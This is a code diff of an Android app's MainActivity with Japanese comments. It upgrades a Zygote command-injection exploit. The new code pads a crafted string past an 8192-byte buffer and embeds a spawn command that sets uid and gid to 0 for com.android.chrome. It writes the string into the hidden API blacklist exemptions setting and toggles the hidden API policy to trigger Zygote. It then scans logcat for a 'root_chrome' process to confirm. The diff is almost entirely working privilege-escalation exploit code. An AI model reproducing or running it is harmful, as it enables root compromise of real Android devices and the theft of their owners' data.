@@ -190,7 +190,7 @@ public class MainActivity extends AppCompatActivity {
 
         if (hasSecure) {
             appendLog("WRITE_SECURE_SETTINGS is GRANTED! Proceeding with Zygote injection.");
-            attemptZygoteInjection();
+            attemptZygoteSpawnInjection();
         } else {
             appendLog("WRITE_SECURE_SETTINGS NOT granted. Skipping Zygote injection.");
         }
@@ -248,29 +248,45 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void attemptZygoteInjection() {
-        appendLog("--- Zygote Injection via Settings ---");
+    private void attemptZygoteSpawnInjection() {
+        appendLog("--- Zygote Spawn Injection via Settings ---");
         try {
             ContentResolver cr = getContentResolver();
+
+            // ペイロード構築: Zygote に spawn コマンドを注入
+            // ターゲット: com.android.chrome を root (uid=0, gid=0) で起動
+            // 注: 実際には chrome は存在する前提。存在しない場合はエラーになるが、ログで確認。
             StringBuilder payload = new StringBuilder();
-            int pad = 30;
-            for (int i = 0; i < pad; i++) {
-                payload.append("A");
+
+            // パディング（BufferedWriter のバッファ 8192 を超えるように）
+            // 実際の spawn コマンドの長さは約 200 バイトなので、8000 バイト程度パディング
+            int padSize = 8000;
+            for (int i = 0; i < padSize; i++) {
+                payload.append('A');
             }
-            payload.append("3\n");
+
+            // spawn コマンド (9 引数)
+            payload.append("9\n");
+            payload.append("--runtime-args\n");
             payload.append("--setuid=0\n");
             payload.append("--setgid=0\n");
-            payload.append("--runtime-init\n");
+            payload.append("--target-sdk-version=29\n");
+            payload.append("--nice-name=root_chrome\n");
+            payload.append("--app-data-dir=/data/data/com.android.chrome\n");
+            payload.append("--package-name=com.android.chrome\n");
+            payload.append("android.app.ActivityThread\n");
+
+            // 遅延エントリ（カンマ区切りで空エントリを追加）
             payload.append(",,,X");
 
             String malicious = payload.toString();
-            appendLog("Setting malicious value: " + malicious.replace("\n", "\\n"));
+            appendLog("Setting malicious value (length: " + malicious.length() + ")");
             Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, malicious);
 
             String oldPolicy = Settings.Global.getString(cr, HIDDEN_API_POLICY);
             Settings.Global.putString(cr, HIDDEN_API_POLICY, "1");
             Settings.Global.putString(cr, HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
-            appendLog("Triggered Zygote update.");
+            appendLog("Triggered Zygote update. Check if root_chrome process appears.");
 
             Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
             appendLog("Cleared setting to avoid persistence.");
@@ -350,7 +366,9 @@ public class MainActivity extends AppCompatActivity {
                     fos.write(logcat.getBytes(StandardCharsets.UTF_8));
                 }
                 appendLog("  Full logcat saved to " + logFile.getAbsolutePath());
-                String[] keywords = {"Zygote", "SystemServer", "setuid", "setgid", "runtime-init", "exploit", "Permission denied"};
+
+                // キーワード検索
+                String[] keywords = {"Zygote", "SystemServer", "setuid", "setgid", "runtime-init", "root_chrome", "exploit", "Permission denied", "ActivityThread"};
                 for (String kw : keywords) {
                     if (logcat.contains(kw)) {
                         appendLog("  Found keyword '" + kw + "' in logcat");
